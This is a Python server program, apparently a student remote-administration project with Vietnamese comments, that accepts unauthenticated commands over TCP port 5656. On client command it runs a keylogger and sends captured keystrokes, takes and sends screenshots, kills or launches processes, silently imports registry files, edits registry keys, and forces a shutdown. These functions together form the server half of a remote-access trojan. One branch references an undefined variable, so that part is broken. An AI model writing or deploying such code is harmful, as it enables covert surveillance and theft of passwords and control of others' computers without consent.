import os
import tkinter as tk
import socket
import subprocess
import winreg
from designer import ServerDesignerApp
from mss import mss
import psutil
import subprocess
import re
from keylog import Keylog

class ServerApp(ServerDesignerApp): 
    def __init__(self):
        super().__init__()
        self.keylogger = Keylog()
        
    def button1_Click(self):
        ip = ("0.0.0.0", 5656)
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(ip) #gắn kết địa chỉ IP và cổng cho socket server
        server.listen(100) # Hàm này sẽ trả về một đối tượng socket mới và địa chỉ IP của client.
        print("Đang lắng nghe kết nối từ client...")
        client, addr = server.accept()
        print(f"Đã kết nối với client từ {ip}")
        ns = client.makefile("rw") # tạo một đối tượng luồng (stream) để gửi và nhận dữ liệu giữa client và server thông qua socket đã thiết lập
        s = ""

        # Nhận thông điệp từ client
        data = client.recv(1024).decode()
        print(f"Client gửi: {data}")

        try:
            while True:
                s = self.receive_signal(ns)
                if s == "KEYLOG":
                    self.keylog(ns, client)
                elif s == "TAKEPIC":
                    self.takepic(ns, client)
                elif s == "REGISTRY":
                    self.registry(ns, client)
                elif s == "PROCESS":
                    self.process(ns, client)
                elif s == "APPLICATION":
                    self.application(ns, client)
                elif s == "SHUTDOWN":
                    self.shutdown()
                elif s == "QUIT":
                    client.shutdown(socket.SHUT_RDWR)
                    client.close()
                    server.close()
                    self.destroy()
                    return
        finally:
            client.shutdown(socket.SHUT_RDWR)
            client.close()
          
            
    def receive_signal(self, ns):
        try:
            signal = ns.readline().strip() # readline: đọc dữ liệu từ ns, #strip: bỏ khoảng trắng trong dữ liệu
            return signal
        except Exception as ex:
            return "QUIT"
        
    def takepic(self, ns, client):
        with mss() as sct:
            while True:
                ss = self.receive_signal(ns)
                if ss == "TAKE":
                    screenshot = sct.shot()
                    self.send_screenshot(client, screenshot)
               
                elif ss == "QUIT":
                    return
    
    def send_screenshot(self, client, screenshot):
        with open(screenshot, "rb") as f:
            screenshot_data = f.read()
            screenshot_size = len(screenshot_data)
            screenshot_size_bytes = screenshot_size.to_bytes(4, byteorder='big')
            
            client.sendall(screenshot_size_bytes)
            client.sendall(screenshot_data)
            
    def process(self, ns, client):
        while True:
            signal = self.receive_signal(ns)
        
            if signal == "XEM":
                processes = psutil.process_iter(attrs=['pid', 'name', 'num_threads'])
                process_info = []

                for proc in processes:
                    try:
                        process_name = proc.info['name']
                        pid = proc.info['pid']
                        num_threads = proc.info['num_threads']
                        process_info.append(f"Name: {process_name}, PID: {pid}, Threads: {num_threads}")
                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        pass

                num_processes = len(process_info)
                num_processes_bytes = num_processes.to_bytes(4, byteorder='big')

                client.sendall(num_processes_bytes)
                
                for info in process_info:
                    info_bytes = info.encode('utf-8')  # Chuyển chuỗi sang bytes
                    info_length_bytes = len(info_bytes).to_bytes(4, byteorder='big')  # Độ dài của dữ liệu
                    client.sendall(info_length_bytes)
                    client.sendall(info_bytes)
                

            elif signal == "KILL":
                signal2 = self.receive_signal(ns)
                if signal2 == "KILLID":
                    pid_to_kill = self.receive_signal(ns)
                    try:
                        process = psutil.Process(int(pid_to_kill))
                        process.terminate()
                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        return
                    ns.flush()

            elif signal == "START":
                signal2 = self.receive_signal(ns)
                if signal2 == "STARTID":
                    program_name = self.receive_signal(ns)
                    try:
                        process = psutil.Popen(program_name)
                    except Exception as e: 
                        return
                    ns.flush()

            elif signal == "QUIT":
                break
            
    def application(self, ns, client):
       while True:
            signal = self.receive_signal(ns)
           
            if signal == "XEM":
                processes = subprocess.Popen([
                    "powershell",
                    "gps",
                    "| ? { $_.MainWindowTitle }",
                    "| select ProcessName, Id, @{Name='ThreadCount';Expression ={$_.Threads.Count}}, CPU"
                ], shell=True, stdout=subprocess.PIPE).stdout.readlines()[3:-2]
                processes = [process.decode().rstrip() for process in processes]
                process_info = []

                for process in processes:
                    m = re.match("(.+?) +(\d+) +(\d+) *(\d*,?\d*)", process)
                    process_info.append([m.group(1), m.group(2), m.group(3), m.group(4) if m.group(4) else "0"])
                
                apps = []
                
                for info in process_info:
                    process_name = info[0]
                    pid = info[1]
                    num_threads = info[2]
                    info_str = f'Name: {process_name}, PID: {pid}, Threads: {num_threads}'
                    apps.append(info_str)
                    
                num_processes = len(apps)
                num_processes_bytes = num_processes.to_bytes(4, byteorder='big')

                client.sendall(num_processes_bytes)
        
                for info in apps:   
                    info_bytes = info.encode('utf-8')  # Chuyển chuỗi sang bytes
                    info_length_bytes = len(info_bytes).to_bytes(4, byteorder='big')  # Độ dài của dữ liệu
                    client.sendall(info_length_bytes)
                    client.sendall(info_bytes)

            elif signal == "KILL":
                signal2 = self.receive_signal(ns)
                if signal2 == "KILLID":
                    pid_to_kill = self.receive_signal(ns)
                    try:
                        process = psutil.Process(int(pid_to_kill))
                        process.terminate()
                        
                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        return
                    ns.flush()

            elif signal == "START":
                signal2 = self.receive_signal(ns)
                if signal2 == "STARTID":
                    program_name = self.receive_signal(ns)
                   
                    try:
                        process = psutil.Popen(program_name)
                    except Exception as e: 
                        return
                    ns.flush()

            elif signal == "QUIT":
                break
        
    def keylog(self, ns, client):
        while True:
            s = self.receive_signal(ns)
            if s == "PRINT":
                client.sendall((self.keylogger.print().replace("\n", "\r") + "\n").encode())
            elif s == "HOOK":
                self.keylogger.hook()
            elif s == "UNHOOK":
                self.keylogger.unhook()
            elif s == "CLEAR":
                self.keylogger.clear()
                client.sendall((self.keylogger.print().replace("\n", "\r") + "\n").encode())
            elif s == "QUIT":
                return
        
    def shutdown(self):
        subprocess.run(["shutdown", "/s", "/f", "/t", "15"])
         
    def registry(self, ns, client):
        while True:
            s = ""            
            s = self.receive_signal(ns)
            if s == "QUIT":
                return
            if s == "SEND_CONTENT":
                try:
                    # Receive the registry content
                    registry_content = client.recv(4096).decode()

                    path = os.path.join(os.path.dirname(__file__), "cache\\registry.reg")

                    with open(path, "w") as f:
                        f.write(registry_content)

                    result = subprocess.run(
                        f'regedit.exe /s "{path}"',
                        shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
                    )

                    if result.stderr:
                        client.sendall("Failed to edit registry\rPlease try again".encode())
                    else:
                        client.sendall("Edited registry!".encode())
                        
                except Exception as e:
                    print("Error: ", str(e))
            
            if s == "REG":
                s = client.recv(4096).decode()

                with open("fileReg.reg", "w") as fin:
                    fin.write(s)
                
                s = os.path.join(os.path.dirname(os.path.abspath(__file__)), "fileReg.reg")
                try:
                    result = subprocess.run(
                            f'regedit.exe /s "{path}"',
                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
                        )
                    if result.stderr:
                        client.sendall("Failed to edit registry\rPlease try again".encode())
                    else:
                        client.sendall("Edited registry!".encode())
                except Exception as ex:
                    ns.write("Fail registry\n")
                
                ns.flush()
            
            if s == "SEND":
                option = self.receive_signal(ns).strip()
                link = self.receive_signal(ns).strip()
                value_name = self.receive_signal(ns).strip()
                value = self.receive_signal(ns).strip()
                type_value = self.receive_signal(ns).strip()
                
                a = self.baseRegistryKey(link)
             
                link2 = link[link.index('\\') + 1:]
             
                
                if a is None:
                    s = "Error"
                else:
                    if option == "Create key":
                        s = self.create_key(a, link2)
                    elif option == "Delete key":
                        s = self.delete_key(a, link2)
                    elif option == "Get value":
                        s = self.get_value(a, link2, value_name)
                    elif option == "Set value":
                        s = self.set_value(a, link2, value_name, value, type_value)
                    elif option == "Delete value":
                        s = self.delete_value(a, link2, value_name)
                    else:
                        s = "Error"
                
                ns.write(s + "\n")
                ns.flush()

    def baseRegistryKey(self, link):
        a = None
        if '\\' in link:
            key_name = link.split('\\', 1)[0].upper()
            if key_name == "HKEY_CLASSES_ROOT":
                a = winreg.HKEY_CLASSES_ROOT
            elif key_name == "HKEY_CURRENT_USER":
                a = winreg.HKEY_CURRENT_USER
            elif key_name == "HKEY_LOCAL_MACHINE":
                a = winreg.HKEY_LOCAL_MACHINE
            elif key_name == "HKEY_USERS":
                a = winreg.HKEY_USERS
            elif key_name == "HKEY_CURRENT_CONFIG":
                a = winreg.HKEY_CURRENT_CONFIG
        return a
    
    def get_value(self, a, link, value_name):
        try:
            subkey = winreg.OpenKey(a, link)
            
            op, value_type = winreg.QueryValueEx(subkey, value_name)
            
            s = ""
            if value_type == winreg.REG_MULTI_SZ:
                for value in op:
                    s += value + " "
            elif value_type == winreg.REG_BINARY:
                for value in op:
                    s += str(value) + " "
            else:
                s = str(op)
            winreg.CloseKey(subkey)
            return s
        except Exception as e:
            return "Error: " + str(e)

    def set_value(self, a, link, value_name, value, type_value):
        try:
            subkey = winreg.OpenKey(a, link, 0, winreg.KEY_SET_VALUE)
        except Exception as ex:
            return "Error"
        
        if subkey is None:
            return "Error"
        
        kind = winreg.REG_SZ
        if type_value == "String":
            kind = winreg.REG_SZ
        elif type_value == "Binary":
            kind = winreg.REG_BINARY
            value = bytes(map(int, value.split()))
        elif type_value == "DWORD":
            kind = winreg.REG_DWORD
            value = int(value)
        elif type_value == "QWORD":
            kind = winreg.REG_QWORD
            value = int(value)
        elif type_value == "Multi-String":
            kind = winreg.REG_MULTI_SZ
        elif type_value == "Expandable String":
            kind = winreg.REG_EXPAND_SZ
        else:
            return "Error"
        
        try:
            # set value_name cái mà được truy cập qua subkey được gán giá trị v với kiểu dữ liệu kind
            winreg.SetValueEx(subkey, value_name, 0, kind, value)
            winreg.CloseKey(subkey)
            return "Set value success"
        except Exception as ex:
            return "Error: " + str(ex)
    
    
    def delete_value(self, a, link, value_name):
        try:
            subkey = winreg.OpenKey(a, link, 0, winreg.KEY_ALL_ACCESS)
        except Exception as ex:
            return "Error"
        
        if subkey is None:
            return "Error"

        try:
            winreg.DeleteValue(subkey, value_name)
            winreg.CloseKey(subkey)
            return "Value deleted success"
        except Exception as ex:
            return "Error: " + str(ex)

    def delete_key(self, a, link):
        try:
            winreg.DeleteKeyEx(a, link, winreg.KEY_WOW64_64KEY, 0)
            return "Key deleted success"
        except Exception as ex:
            return "Error: " + str(ex)
    
    def create_key(self, a, link):
        try:
            key = winreg.CreateKeyEx(a, link, 0, winreg.KEY_WOW64_64KEY | winreg.KEY_SET_VALUE)
            winreg.CloseKey(key)
            return "Key created successfully"
        except Exception as e:
            return "Error creating key: " + str(e)
            
if __name__ == "__main__":
    app = ServerApp()
    app.mainloop()
